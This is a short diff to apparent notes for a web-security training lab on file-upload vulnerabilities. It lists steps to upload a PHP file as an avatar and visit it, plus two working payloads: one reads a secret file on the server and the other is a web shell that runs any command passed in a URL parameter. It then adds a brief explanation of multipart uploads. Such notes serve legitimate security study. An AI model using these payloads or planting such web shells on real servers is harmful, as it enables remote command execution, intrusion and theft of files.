@@ -7,8 +7,14 @@ wiener:peter
 -upload shell.php
 -visit /files/avatars/shell.php
 
+-Payload Option
 shell.php
 <?php echo file_get_contents('/home/carlos/secret');?>
 
-shell2.php
+Payload Option
+shell.php
 <?php system($_GET['cmd']);?>
+
+Why Use MultipartEncoder?
+When you need to upload files or submit complex form data via HTTP, `multipart/form-data` is the standard format.
+The MultipartEncoder class simplifies the process of creating this format, handling the boundaries and encoding for you.
